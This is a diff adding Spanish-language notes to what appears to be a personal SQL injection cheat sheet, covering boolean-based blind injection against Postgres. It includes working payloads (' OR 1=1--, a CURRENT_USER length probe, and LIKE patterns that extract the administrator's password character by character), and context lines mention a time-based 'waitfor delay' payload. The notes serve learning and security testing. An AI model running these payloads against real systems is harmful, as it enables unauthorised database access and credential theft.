@@ -557,6 +557,34 @@ waitfor delay '00:00:10' Sleep
 ```
 #### Blind:
 - Boleean based:
+  - Basado en que provocar errores o ver sí existe diferencia en la respuesta del servidor a ejecutar querys con errores o valores especificos.
+
+- Postgres:
+1- Comportamiento: Detectar comportamientos basados en la respuesta como, por ejemplo sí el servidor regresa un "welcome" cuando el query regresa al menos una fila, o sí viene vacio no muestra el mensaje.
+  -> Muestra el mensaje por regresar un campo:
+```sql
+  ' OR 1=1--
+```
+  -> No muestra el mensaje por no tener un campo valido:
+```sql
+  ' OR 2=1--
+```
+
+2- Validar en base a función sencilla conociendo el tamaño de variable:
+```sql
+  a' OR LENGTH(CURRENT_USER) = 5--
+```
+
+3- Calcular tamaño del campo:
+```sql
+  a' OR (SELECT password FROM users WHERE username = 'administrator') LIKE '____________________'--
+```
+
+4- Conocer el valor del campo:
+```sql
+  a' OR (SELECT password FROM users WHERE username = 'administrator') LIKE '$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$'--
+```
+
 - Time based:
   - Es en base a una función boleana, donde sí el tiempo de espera a la respuesta es mayor a la normal, significa que evalua la función como true y manda a hacer un sleep, o función que ralentiza su ejecución.
     - MYSQL:
